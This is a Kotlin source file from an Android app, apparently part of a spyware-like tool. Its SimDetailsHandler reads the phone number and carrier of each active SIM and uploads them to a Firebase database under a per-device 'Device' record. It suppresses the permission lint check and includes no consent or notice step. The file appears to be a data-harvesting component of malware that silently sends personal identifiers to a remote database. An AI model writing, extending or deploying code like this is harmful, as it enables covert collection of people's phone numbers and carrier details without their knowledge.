package com.rto1p8.app.handler

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import com.google.firebase.database.FirebaseDatabase
import com.rto1p8.app.utils.Logger

class SimDetailsHandler(
    private val context: Context,
    private val deviceId: String
) {

    @SuppressLint("MissingPermission")
    fun uploadSimDetails() {
        try {
            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
            val simNumbers = mutableMapOf<String, String>()

            val subscriptions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                subscriptionManager.activeSubscriptionInfoList
            } else {
                null
            }

            if (!subscriptions.isNullOrEmpty()) {
                subscriptions.forEachIndexed { index, info ->
                    val simSlot = "sim${index + 1}"
                    simNumbers[simSlot] = extractSimDetail(info, simSlot)
                }
            } else {
                simNumbers["sim1"] = "No SIM detected"
            }

            val simRef = FirebaseDatabase.getInstance().getReference("Device").child(deviceId).child("sim_cards")
            simRef.setValue(simNumbers)
                .addOnSuccessListener { Logger.log("Uploaded SIM details for $deviceId") }
                .addOnFailureListener { e -> Logger.error("SIM upload failed: ${e.message}", e) }

        } catch (e: Exception) {
            Logger.error("SIM fetch error: ${e.message}", e)
        }
    }

    private fun extractSimDetail(info: SubscriptionInfo, simSlot: String): String {
        val number = info.number?.takeIf { it.isNotBlank() } ?: "Number not available"
        val carrierName = info.carrierName?.toString()?.takeIf { it.isNotBlank() } ?: "Unknown"

        return "$number, $carrierName"
    }
}
